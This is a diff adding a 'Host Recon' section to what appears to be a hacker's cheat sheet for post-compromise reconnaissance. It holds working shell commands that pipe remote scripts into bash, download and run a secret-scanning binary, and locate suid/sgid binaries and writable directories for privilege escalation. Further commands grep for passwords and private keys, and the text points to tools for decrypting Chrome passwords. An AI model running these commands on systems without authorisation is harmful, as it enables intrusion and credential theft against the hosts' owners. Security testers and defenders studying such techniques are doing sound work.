@@ -1,0 +1,73 @@
+Host Recon
+
+Get essential information about a host:
+
+bash -c "$(curl -fsSL https://thc.org/ws)"
+
+or
+
+bash -c "$(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh)"
+
+netstat if there is no netstat/ss/lsof:
+
+curl -fsSL https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/tools/awk_netstat.sh | bash
+
+Speed check the system
+
+curl -fsSL https://bench.sh | bash
+# Another speed check:  
+# curl -fsSL https://yabs.sh | bash
+
+Find all suid/sgid binaries:
+
+find  / -xdev -type f -perm /6000  -ls 2>/dev/null
+
+Find all writeable directories:
+
+wfind() {
+    local arr dir
+
+    arr=("$@")
+    while [[ ${#arr[@]} -gt 0 ]]; do
+        dir=${arr[${#arr[@]}-1]}
+        unset "arr[${#arr[@]}-1]"
+        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
+        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
+    done
+}
+# Usage: wfind /
+# Usage: wfind /etc /var /usr 
+
+Find local passwords (using noseyparker or trufflehog):
+
+curl -o np -fsSL https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static
+chmod 700 np && \
+./np scan . && \
+./np report --color=always | less -R
+
+    Use PassDetective to find passwords in ~/.*history
+    Use Chrome-ABE to extract & decrypt Chrome passwords from the running process (windows only)
+    Extract passwords from Browsers using https://github.com/kiryano/chrome-password-decryptor
+
+Using grep:
+
+# Find passwords (without garbage).
+grep -HEronasi  '.{,16}password.{,64}' .
+# Find TLS or OpenSSH keys:
+grep -r -F -- " PRIVATE KEY-----" .
+
+Find Subdomains or emails in files:
+
+resolv() { while read -r x; do r="$(getent hosts "$x")" || continue; echo "${r%% *}"$'\t'"${x}"; done; }
+find_subdomains() {
+	local d="${1//./\\.}"
+	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
+	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
+	[ $# -le 0 ] && { echo -en >&2 "Extract sub-domains from all files (or stdin)\nUsage  : find_subdomains <apex-domain> <file>\nExample: find_subdomain .com | anew"; return; }
+	shift 1
+	[ $# -le 0 ] && [ -t 0 ] && set -- .
+	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
+	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
+}
+# find_subdomain .foobar.com | anew | resolv
+# find_subdomain @gmail.com | anew
